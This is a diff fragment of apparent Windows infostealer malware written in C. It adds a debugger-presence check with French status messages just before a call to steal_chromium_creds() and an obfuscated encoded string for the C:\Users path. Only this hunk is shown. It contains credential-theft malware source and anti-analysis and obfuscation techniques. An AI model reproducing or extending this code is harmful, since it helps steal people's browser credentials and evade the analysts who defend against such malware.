@@ -15,6 +15,23 @@ int main(void) {
   // Allows us to print non-ASCII characters for debug
   SetConsoleOutputCP(CP_UTF8);
 
+  BOOL isDebuggerPresent = FALSE;
+  HANDLE hProcess = GetCurrentProcess();
+
+  if (CheckRemoteDebuggerPresent(hProcess, &isDebuggerPresent)) {
+    if (isDebuggerPresent) {
+      printf("Un débogueur est détecté sur ce processus.\n");
+    } else {
+      printf("Aucun débogueur n'est détecté sur ce processus.\n");
+    }
+  } else {
+    // En cas d'échec, afficher l'erreur
+    printf(
+        "Erreur lors de l'appel à CheckRemoteDebuggerPresent. Code d'erreur : "
+        "%lu\n",
+        GetLastError());
+  }
+
   steal_chromium_creds();
 
   wchar_t users_path[] = L"\x69\x10\x76\x7f\x59\x4f\x58\x59";  // C:\Users
